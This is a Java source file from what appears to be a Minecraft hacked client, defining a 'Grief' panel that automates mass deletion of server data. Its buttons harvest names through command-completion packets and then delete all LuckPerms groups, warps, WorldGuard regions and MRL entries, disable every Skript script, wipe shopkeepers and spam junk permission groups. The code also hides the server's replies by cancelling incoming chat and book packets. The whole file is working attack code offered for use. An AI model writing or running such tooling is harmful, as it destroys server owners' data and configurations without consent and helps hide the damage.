/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.render;

import java.util.Arrays;
import java.util.Random;

import com.mojang.brigadier.suggestion.Suggestion;
import com.mojang.brigadier.suggestion.Suggestions;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.s2c.play.CommandSuggestionsS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.OpenWrittenBookS2CPacket;
import net.minecraft.util.math.MathHelper;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.gui.panels.PanelsGui;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.config.StringSetting;
import net.shadow.client.feature.gui.clickgui.element.Element;
import net.shadow.client.feature.gui.clickgui.element.impl.config.DoubleSettingEditor;
import net.shadow.client.feature.gui.clickgui.element.impl.config.StringSettingEditor;
import net.shadow.client.feature.gui.panels.PanelsGui;
import net.shadow.client.feature.gui.panels.elements.PanelButton;
import net.shadow.client.feature.gui.panels.elements.PanelFrame;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.event.EventType;
import net.shadow.client.helper.event.Events;
import net.shadow.client.helper.event.events.PacketEvent;
import net.shadow.client.helper.util.Transitions;
import net.shadow.client.helper.util.Utils;

public class ShadowScreen extends Module {

    final PanelsGui menu = new PanelsGui(new PanelFrame[]{
        new PanelFrame(100, 100, 250, 190, "Grief", new Element[]{
            new PanelButton(0, 0, -1, "Delete LP Data", () -> {
                packetinputmode = "lp";
                enabled = true;
                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/lp deletegroup "));
            }),
            new PanelButton(0, 20, -1, "Delete MRL Data", () -> {
                packetinputmode = "mrl";
                enabled = true;
                ShadowMain.client.player.sendChatMessage("/mrl list");
            }),
            new PanelButton(0, 40, -1, "Disable Skripts", () -> {
                ShadowMain.client.player.sendChatMessage("/sk disable all");
            }),
            new PanelButton(0, 60, -1, "Delete Shopkeepers", () -> {
                new Thread(() -> {
                    ShadowMain.client.player.sendChatMessage("/shopkeeper deleteall admin");
                    Utils.sleep(50);
                    ShadowMain.client.player.sendChatMessage("/shopkeeper confirm");
                }).start();
            }),
            new PanelButton(0, 80, -1, "Spam LP Data", () -> {
                for (int i = 0; i < 100; i++) {
                    ShadowMain.client.player.sendChatMessage("/lp creategroup " + i + new Random().nextInt(10000));
                }
            }),
            new PanelButton(0, 100, -1, "Delete Warp Data", () -> {
                packetinputmode = "warps";
                enabled = true;
                ShadowMain.client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/delwarp "));
            }),
            new PanelButton(0, 120, -1, "Delete Region Data", () -> {
                packetinputmode = "worldguard";
                enabled = true;
                ShadowMain.client.player.sendChatMessage("/rg list");
            })
        })
    });

    String packetinputmode = "";
    int blocked = 0;
    boolean enabled = false;
    boolean alt = false;

    public ShadowScreen() {
        super("Tools", "tools screen", ModuleType.RENDER);
        Events.registerEventHandler(EventType.PACKET_RECEIVE, packet2 -> {
            if(!enabled)return;
            PacketEvent event = (PacketEvent)packet2;
            if (event.getPacket() instanceof OpenWrittenBookS2CPacket && !alt) {
                event.setCancelled(true);
                enabled = false;
            }
            if (event.getPacket() instanceof GameMessageS2CPacket && alt) {
                blocked++;
                event.setCancelled(true);
                if (blocked > 2) {
                    blocked = 0;
                    enabled = false;
                    alt = false;
                }
            }
            if (event.getPacket() instanceof GameMessageS2CPacket packet) {
                String message;
                switch (packetinputmode) {
                    case "worldguard" -> {
                        message = packet.getMessage().getString();
                        if (message.contains("------------------- Regions -------------------")) {
                            message = message.replace("------------------- Regions -------------------", "");
                            message = message.trim();
                            message = message.replace("[Info]", "");
                            message = message.trim();
                            String[] arr = message.trim().split(" ");
                            for (String h : arr) {
                                ShadowMain.client.player.sendChatMessage("/rg delete " + h.strip().replace("\n", "").substring(2, h.length()));
                            }
                            enabled = false;
                        }
                    }
                    case "mrl" -> {
                        message = packet.getMessage().getString();
                        if (message.contains(",")) {
                            message = message.replace(",", "");
                            String[] based = message.split(" ");
                            String[] copied = Arrays.copyOfRange(based, 1, based.length);
                            for (String mrl : copied) {
                                ShadowMain.client.player.sendChatMessage("/mrl erase " + mrl);
                            }
                            enabled = false;
                        }
                    }
                }
            }
            if (event.getPacket() instanceof CommandSuggestionsS2CPacket packet) {
                switch (packetinputmode) {
                    case "lp" -> {
                        Suggestions all = packet.getSuggestions();
                        for (Suggestion i : all.getList()) {
                            ShadowMain.client.player.sendChatMessage("/lp deletegroup " + i.getText());
                        }
                        enabled = false;
                    }
                    case "warps" -> {
                        Suggestions alla = packet.getSuggestions();
                        for (Suggestion i : alla.getList()) {
                            ShadowMain.client.player.sendChatMessage("/delwarp " + i.getText());
                        }
                        enabled = false;
                    }
                }
            }
        });
    }

    @Override
    public void tick() {
    }

    @Override
    public void enable() {
        ShadowMain.client.setScreen(menu);
        this.setEnabled(false);
    }

    @Override
    public void disable() {
    }

    @Override
    public void onFastTick() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
